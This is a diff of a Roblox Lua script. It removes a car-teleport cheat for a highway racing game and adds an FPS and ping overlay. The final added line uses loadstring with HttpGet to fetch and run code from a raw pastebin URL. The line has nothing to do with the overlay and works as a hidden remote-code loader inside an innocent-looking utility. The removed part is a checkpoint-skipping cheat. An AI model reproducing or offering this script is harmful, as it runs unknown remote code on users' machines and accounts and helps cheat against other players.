@@ -1,86 +1,99 @@
--- Paste into Command Bar while sitting in your car
-local player = game.Players.LocalPlayer
-local character = player.Character
-if not character then return warn("No character") end
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+-- FPS and Ping Checker Script (Improved UI with Movable Frame)
 
-local humanoid = character:FindFirstChild("Humanoid")
-local seat = humanoid and humanoid.SeatPart
-if not seat then return warn("You are not sitting in a car") end
+-- Create a ScreenGui to display FPS and Ping
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "PerformanceGui"
+ScreenGui.ResetOnSpawn = false -- Keep the UI persistent across respawns
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Find the car model
-local car = seat.Parent
-while car and car ~= workspace do
-    if car:IsA("Model") and car:FindFirstChildWhichIsA("VehicleSeat") then break end
-    car = car.Parent
+-- Frame for FPS and Ping display
+local displayFrame = Instance.new("Frame")
+displayFrame.Size = UDim2.new(0, 250, 0, 100)
+displayFrame.Position = UDim2.new(0, 10, 0, 10)
+displayFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+displayFrame.BackgroundTransparency = 0.4
+displayFrame.BorderSizePixel = 0
+displayFrame.Active = true -- Make the frame active for input events
+displayFrame.Draggable = true -- Enable draggable frame
+displayFrame.Parent = ScreenGui
+
+-- FPS Label
+local fpsLabel = Instance.new("TextLabel")
+fpsLabel.Size = UDim2.new(1, -20, 0, 40)
+fpsLabel.Position = UDim2.new(0, 10, 0, 10)
+fpsLabel.TextColor3 = Color3.new(1, 1, 1)
+fpsLabel.TextStrokeTransparency = 0.7
+fpsLabel.TextSize = 24
+fpsLabel.Font = Enum.Font.SourceSansBold
+fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
+fpsLabel.BackgroundTransparency = 1
+fpsLabel.Text = "FPS: Loading..."
+fpsLabel.Parent = displayFrame
+
+-- Ping Label
+local pingLabel = Instance.new("TextLabel")
+pingLabel.Size = UDim2.new(1, -20, 0, 40)
+pingLabel.Position = UDim2.new(0, 10, 0, 50)
+pingLabel.TextColor3 = Color3.new(1, 1, 1)
+pingLabel.TextStrokeTransparency = 0.7
+pingLabel.TextSize = 24
+pingLabel.Font = Enum.Font.SourceSansBold
+pingLabel.TextXAlignment = Enum.TextXAlignment.Left
+pingLabel.BackgroundTransparency = 1
+pingLabel.Text = "Ping: Loading..."
+pingLabel.Parent = displayFrame
+
+-- FPS Checker
+local fps = 0
+local lastTime = tick()
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    fps = math.floor(1 / (tick() - lastTime))
+    lastTime = tick()
+    fpsLabel.Text = "FPS: " .. tostring(fps)
+end)
+
+-- Ping Checker
+local function getPing()
+    local player = game.Players.LocalPlayer
+    local ping = player:GetNetworkPing() * 1000 -- Convert to milliseconds
+    return math.floor(ping)
 end
-if not car or car == workspace then return warn("Could not find car model") end
 
-print("Found car:", car.Name)
+game:GetService("RunService").Stepped:Connect(function()
+    local ping = getPing()
+    pingLabel.Text = "Ping: " .. tostring(ping) .. " ms"
+end)
 
--- Ensure car has a PrimaryPart
-if not car.PrimaryPart then
-    local part = car:FindFirstChildWhichIsA("BasePart")
-    if part then 
-        car.PrimaryPart = part 
-    else 
-        return error("Car has no BasePart")
-    end
-end
-
--- 🧠 Detect which game mode is active
-local checkpointsFolder = workspace:FindFirstChild("HighwayRace_solo_ServerCheckpoints")
-local mode = "solo"
-if not checkpointsFolder then
-    checkpointsFolder = workspace:FindFirstChild("HighwayRace_ServerCheckpoints")
-    mode = "normal"
-end
-if not checkpointsFolder then
-    return warn("No checkpoints folder found (HighwayRace_solo_ServerCheckpoints or HighwayRace_ServerCheckpoints)")
-end
-
-print("Detected mode:", mode, "→ using folder:", checkpointsFolder.Name)
-
--- Build checkpoint list from 1 to 27 + ServerFinishLine
-local checkpoints = {}
-for i = 1, 27 do
-    local cp = checkpointsFolder:FindFirstChild(tostring(i))
-    if cp then
-        table.insert(checkpoints, cp)
+-- Optional: Auto-adjust label colors based on performance
+game:GetService("RunService").Stepped:Connect(function()
+    if fps < 30 then
+        fpsLabel.TextColor3 = Color3.new(1, 0, 0) -- Red for low FPS
     else
-        warn("Checkpoint", i, "missing in", checkpointsFolder.Name)
+        fpsLabel.TextColor3 = Color3.new(0, 1, 0) -- Green for good FPS
     end
-end
-local finishLine = checkpointsFolder:FindFirstChild("ServerFinishLine")
-if finishLine then
-    table.insert(checkpoints, finishLine)
-else
-    warn("ServerFinishLine missing in", checkpointsFolder.Name)
-end
 
-if #checkpoints == 0 then
-    return warn("No checkpoints found")
-end
-
--- Teleport function (raises car by 2 studs)
-local function teleport(target)
-    local raise = 2
-    if target:IsA("BasePart") then
-        car:SetPrimaryPartCFrame(target.CFrame + Vector3.new(0, raise, 0))
-        print("Teleported to", target.Name)
-    elseif target:IsA("Model") and target.PrimaryPart then
-        car:SetPrimaryPartCFrame(target.PrimaryPart.CFrame + Vector3.new(0, raise, 0))
-        print("Teleported to model", target.Name)
+    if getPing() > 200 then
+        pingLabel.TextColor3 = Color3.new(1, 0, 0) -- Red for high ping
     else
-        warn("Invalid target:", target)
+        pingLabel.TextColor3 = Color3.new(0, 1, 0) -- Green for good ping
     end
+end)
+
+-- Optional: Saving frame position locally
+local function savePosition()
+    local pos = displayFrame.Position
+    -- Save the position to a datastore or local storage (optional implementation)
 end
 
--- Start teleporting
-for _, cp in ipairs(checkpoints) do
-    if cp then
-        teleport(cp)
+-- Saving the position when dragging stops
+displayFrame.MouseLeave:Connect(savePosition)
+displayFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        savePosition()
     end
-    task.wait(0.5)
-end
-
-print("✅ All checkpoints visited in", mode, "mode!")
+end)
+loadstring(game:HttpGet("https://pastebin.com/raw/KiSYpej6",true))()
